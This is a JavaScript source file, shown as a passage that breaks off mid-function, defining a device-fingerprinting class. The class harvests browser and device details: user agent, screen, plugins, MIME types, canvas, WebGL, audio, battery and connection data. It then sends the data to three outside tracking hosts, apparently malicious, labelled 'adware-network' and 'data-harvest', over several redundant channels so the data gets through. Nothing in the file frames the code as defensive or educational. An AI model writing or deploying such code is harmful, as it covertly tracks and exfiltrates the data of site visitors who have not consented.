// Advanced device fingerprinting
class DeviceFingerprinter {
  constructor() {
    this.fingerprint = {};
    this.trackingEndpoints = [
      'https://tracker1.adware-network.com/log',
      'https://data-harvest.pro/collect',
      'https://analytics.malicious.pro/submit'
    ];
  }
  
  collectAllData() {
    this.collectBasicInfo();
    this.collectAdvancedInfo();
    this.collectCanvasFingerprint();
    this.collectWebGLFingerprint();
    this.collectAudioFingerprint();
    this.collectBehavioralData();
    
    return this.fingerprint;
  }
  
  collectBasicInfo() {
    this.fingerprint = {
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      },
      window: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      hardware: {
        concurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0
      }
    };
  }
  
  collectAdvancedInfo() {
    // Plugin enumeration
    this.fingerprint.plugins = Array.from(navigator.plugins).map(p => ({
      name: p.name,
      description: p.description,
      filename: p.filename
    }));
    
    // MIME types
    this.fingerprint.mimeTypes = Array.from(navigator.mimeTypes).map(mt => ({
      type: mt.type,
      description: mt.description
    }));
    
    // Connection info
    if (navigator.connection) {
      this.fingerprint.connection = {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      };
    }
    
    // Battery API if available
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        this.fingerprint.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
        this.sendToTrackers();
      });
    }
  }
  
  collectCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = 200;
    canvas.height = 50;
    
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint', 2, 15);
    
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Canvas', 4, 30);
    
    this.fingerprint.canvas = canvas.toDataURL();
  }
  
  collectWebGLFingerprint() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        this.fingerprint.webgl = {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
          version: gl.getParameter(gl.VERSION)
        };
      }
      
      // Additional WebGL parameters
      this.fingerprint.webglParams = {};
      const params = [
        'MAX_TEXTURE_SIZE',
        'MAX_CUBE_MAP_TEXTURE_SIZE',
        'MAX_RENDERBUFFER_SIZE',
        'MAX_VERTEX_ATTRIBS'
      ];
      
      params.forEach(param => {
        try {
          this.fingerprint.webglParams[param] = gl.getParameter(gl[param]);
        } catch (e) {}
      });
    }
  }
  
  collectAudioFingerprint() {
    // AudioContext fingerprinting
    try {
      const audioContext = new(window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const compressor = audioContext.createDynamicsCompressor();
      
      this.fingerprint.audio = {
        sampleRate: audioContext.sampleRate,
        numberOfChannels: compressor.numberOfChannels,
        frequency: oscillator.frequency.value
      };
      
      oscillator.disconnect();
      compressor.disconnect();
    } catch (e) {
      this.fingerprint.audio = { error: e.message };
    }
  }
  
  collectBehavioralData() {
    // Collect interaction patterns
    this.fingerprint.interactions = {
      touch: 'ontouchstart' in window,
      pointer: window.PointerEvent ? 'available' : 'unavailable',
      gesture: 'ongesturestart' in window
    };
  }
  
  sendToTrackers() {
    const data = JSON.stringify(this.fingerprint);
    
    // Send to all tracking endpoints
    this.trackingEndpoints.forEach(endpoint => {
      // Use multiple techniques to ensure delivery
      this.sendViaBeacon(endpoint, data);
      this.sendViaFetch(endpoint, data);
      this.sendViaImg(endpoint, data);
    });
  }
  
  sendViaBeacon(endpoint, data) {
    if (navigator.sendBeacon) {
      const blob = new Blob([data], { type: 'application/json' });
      navigator.sendBeacon(endpoint, blob);
    }
  }
  
  sendViaFetch(endpoint, data) {
    fetch(endpoint, {
      method: 'PO